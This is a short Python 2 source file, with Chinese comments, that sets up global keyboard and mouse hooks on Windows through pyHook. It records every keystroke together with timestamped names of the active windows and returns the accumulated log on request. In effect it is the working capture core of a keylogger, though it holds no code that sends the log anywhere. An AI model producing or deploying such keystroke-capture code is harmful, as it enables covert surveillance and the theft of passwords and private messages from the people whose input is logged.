# -*- coding: utf-8 -*-
import pyHook
import pythoncom
import time
import thread

class RecordMessage:
	def __init__(self):
		# 创建一个“钩子”管理对象
		self.hm = pyHook.HookManager()
		self.beforeWindow = ''
		self.log = ''
		self.aline = ''
		self.mylock = thread.allocate_lock()

	def onKeyboardEvent(self,event):
		self.mylock.acquire()
		if event.Ascii == 13:
			self.log += '\n\r'
			print('\n\r')
		elif event.Ascii == 8:
			self.log = self.log[:-1]
		else:
			self.log += chr(event.Ascii)
			print(chr(event.Ascii))
		self.mylock.release()
		return True
		
	def onMouseEvent(self,event):
		eventWinName = str(event.WindowName)
		if (self.beforeWindow != eventWinName)&(eventWinName!='N')&(eventWinName!='None')&(eventWinName!='Tab')&(eventWinName!='运行应用程序'):
			strtime = time.strftime('%d-%H:%M:%S',time.localtime())
			self.mylock.acquire()
			self.log += "\n\r" + eventWinName+" at "+strtime + "\n\r"
			print(str(event.WindowName) + "\n\r")
			self.beforeWindow = event.WindowName
			self.mylock.release()
		return True
		
	def go(self):
		# 监听所有键盘事件
		self.hm.KeyDown = self.onKeyboardEvent
		# 设置键盘“钩子”
		self.hm.HookKeyboard()

		# 监听所有鼠标事件
		self.hm.MouseAll = self.onMouseEvent
		# 设置鼠标“钩子”
		self.hm.HookMouse()

		# 进入循环，如不手动关闭，程序将一直处于监听状态
		thread.start_new_thread(pythoncom.PumpMessages(),())
		
	def GetInfo(self):
		self.mylock.acquire()
		log = self.log
		self.log = ''
		self.mylock.release()
		return log